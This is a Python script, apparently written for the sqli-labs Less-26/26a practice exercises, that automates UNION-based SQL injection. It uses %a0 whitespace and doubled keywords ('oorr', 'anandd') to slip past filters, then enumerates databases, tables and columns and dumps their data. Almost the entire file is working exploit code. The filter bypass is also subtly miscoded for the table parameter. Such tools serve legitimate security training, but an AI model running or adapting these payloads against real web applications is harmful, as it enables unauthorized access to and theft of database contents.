import requests
from bs4 import BeautifulSoup


class Less26_Less26a(object):

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c,a):

        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

        self.dbs = dbs

        self.tables = tables

        self.columns = columns            # 初始化

        self.schema = schema

        self.d = d.replace('or','oorr')

        self.d = self.d.replace('and','anandd')

        self.t = t.replace('or','oorr')

        self.d = self.d.replace('and','anandd')

        self.c = c.replace('or','oorr')

        self.c = self.c.replace('and','anandd')

        self.a = a





    def soup_a(self,text):

        soup = BeautifulSoup(text,"html5lib")    # 筛选数据

        strings = soup.find_all('font')[2].text

        return strings.split("You")[1].split(":")[1].split(",")




    def dbs_payload(self):

        if self.level == 26 and self.a:   # level 26a payload

            rep = requests.get(self.url+"?id=0')%a0union%a0select%a01,(select%a0group_concat(schema_name)%a0from%a0infoorrmation_schema.schemata),3%a0||('1")

            print(self.soup_a(rep.text))

                                # level 26 payload
        elif self.level == 26 and not self.a:

            rep = requests.get(self.url+"?id=0'%a0union%a0select%a01,(select%a0group_concat(schema_name)%a0from%a0infoorrmation_schema.schemata),3%a0||'1")

            print(self.soup_a(rep.text))



    def tables_payload(self):

        if self.level == 26 and self.a: # 26a payload

            rep = requests.get(self.url+"?id=0')%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='"+self.d+"'),3%a0||('1")

            print(self.soup_a(rep.text))


        elif self.level == 26 and not self.a:           # 26 payload

            rep = requests.get(self.url+"?id=0'%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='"+self.d+"'),3%a0||'1")

            print(self.soup_a(rep.text))




    def columns_payload(self):

        if self.level == 26 and self.a: # 26a payload

            rep = requests.get(self.url+"?id=0')%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoORrmation_schema.columns%a0where%a0table_schema='"+self.d+"'%a0anandd%a0table_name='"+self.t+"'),3%a0||('1")

            print(self.soup_a(rep.text))

        elif self.level == 26 and not self.a:  # 26 payload

            rep = requests.get(self.url+"?id=0'%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoORrmation_schema.columns%a0where%a0table_schema='"+self.d+"'%a0anandd%a0table_name='"+self.t+"'),3%a0||'1")

            print(self.soup_a(rep.text))



    def data_payload(self):

        if self.level == 26 and self.a:

            rep = requests.get(self.url+"?id=0')%a0union%a0select%a01,(select%a0group_concat("+self.c+")%a0from%a0"+self.d+"."+self.t+"),3%a0||('1")

            print(self.soup_a(rep.text))


        elif self.level == 26 and not self.a:      # 25a payload

            rep = requests.get(self.url+"?id=0'%a0union%a0select%a01,(select%a0group_concat("+self.c+")%a0from%a0"+self.d+"."+self.t+"),3%a0||'1")

            print(self.soup_a(rep.text))



    def DBS(self):

        self.dbs_payload()


    def TABLES(self):           # 使用对应的payload

        self.tables_payload()


    def COLUMNS(self):

        self.columns_payload()


    def SCHEMA(self):

        self.data_payload()


    def TYPE(self):

        if self.dbs and not self.tables and not self.columns and not self.schema:  # 如果枚举数据库被设置

            self.DBS()

        elif self.d != '' and self.tables and not self.columns and not self.schema: # 如果枚举表和数据库名被设置

            self.TABLES()

        elif self.t != '' and self.columns and self.d != '' and not self.schema and not self.dbs and not self.tables: # 如果枚举列,和数据表,和数据列被设置

            self.COLUMNS()

        elif self.c != '' and self.t != '' and self.d != '' and self.schema and not self.dbs and not self.tables and not self.columns: # 如果数据表,数据库,数据列被设置

            self.SCHEMA()

        else:
            print("wrong options and bad type!")



    def Less_26(self):
        self.TYPE()
        

                              # 调用对应的level 等级
    def Less_26a(self):
        self.TYPE()

